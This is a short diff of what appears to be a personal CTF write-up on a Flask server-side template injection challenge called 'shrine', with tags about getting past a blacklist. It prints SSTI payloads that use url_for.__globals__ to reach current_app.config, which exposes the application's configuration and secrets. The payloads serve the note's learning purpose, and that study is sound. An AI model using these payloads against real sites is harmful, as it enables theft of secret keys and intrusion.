@@ -45,9 +45,11 @@ return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
 /shrine/{{url_for.__globals__}}
 ```
 ![[Pasted image 20221129160253.png]]
+
 ```python
 /shrine/{{url_for.__globals__['current_app'].config}}
 ```
+
 ![[Pasted image 20221129160733.png]]
 
 #Web #python #flask #SSTI #urlfor #globals #绕过 
